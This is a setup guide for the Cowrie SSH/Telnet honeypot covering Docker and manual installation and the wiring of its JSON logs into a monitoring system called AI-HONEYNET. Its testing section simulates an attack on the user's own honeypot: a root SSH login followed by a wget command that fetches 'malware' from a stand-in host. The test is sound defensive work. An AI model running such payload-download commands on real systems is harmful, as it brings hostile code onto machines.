# Cowrie Honeypot Setup Guide

This guide explains how to set up the Cowrie SSH/Telnet honeypot to feed data into the AI-HONEYNET system.

## Prerequisites

- Linux server (Ubuntu/Debian recommended) or Docker
- Python 3.8+
- Network access to port 22 (SSH) and 23 (Telnet)

## Option 1: Docker Setup (Recommended)

The easiest way to run Cowrie is using Docker.

1. **Pull the image**:
   ```bash
   docker pull cowrie/cowrie
   ```

2. **Run Cowrie**:
   ```bash
   docker run -d \
     -p 2222:2222 \
     -p 2223:2223 \
     -v $(pwd)/cowrie-logs:/cowrie/var/log/cowrie \
     --name cowrie \
     cowrie/cowrie
   ```
   *Note: Cowrie runs on 2222 by default. You can use iptables to forward port 22 to 2222.*

3. **Configure JSON Logging**:
   Cowrie logs to JSON by default in `var/log/cowrie/cowrie.json`. This is the file AI-HONEYNET needs.

4. **Connect to AI-HONEYNET**:
   - Ensure the `cowrie-logs` directory is accessible to the AI-HONEYNET backend.
   - In `docker-compose.yml`, mount this directory:
     ```yaml
     backend:
       volumes:
         - /path/to/cowrie-logs/cowrie.json:/mock-data/cowrie.json
     ```

## Option 2: Manual Installation

1. **Create user**:
   ```bash
   sudo adduser --disabled-password cowrie
   su - cowrie
   ```

2. **Download Cowrie**:
   ```bash
   git clone http://github.com/cowrie/cowrie
   cd cowrie
   ```

3. **Install Dependencies**:
   ```bash
   python -m venv cowrie-env
   source cowrie-env/bin/activate
   pip install --upgrade pip
   pip install --upgrade -r requirements.txt
   ```

4. **Configuration**:
   Copy the config file:
   ```bash
   cp etc/cowrie.cfg.dist etc/cowrie.cfg
   ```
   Edit `etc/cowrie.cfg` to enable JSON logging (usually enabled by default).

5. **Start Cowrie**:
   ```bash
   bin/cowrie start
   ```

## Integration with AI-HONEYNET

1. **Log Location**: Identify where `cowrie.json` is generated (usually `var/log/cowrie/cowrie.json`).
2. **Backend Config**: Update `docker-compose.yml` or `.env` to point `COWRIE_LOG_PATH` to this file.
3. **Permissions**: Ensure the backend container has read access to the log file.

## Testing

1. **Simulate Attack**:
   ```bash
   ssh -p 2222 root@localhost
   # Password can be anything
   wget http://example.com/malware
   exit
   ```

2. **Verify**:
   Check AI-HONEYNET dashboard to see the event appear in real-time.
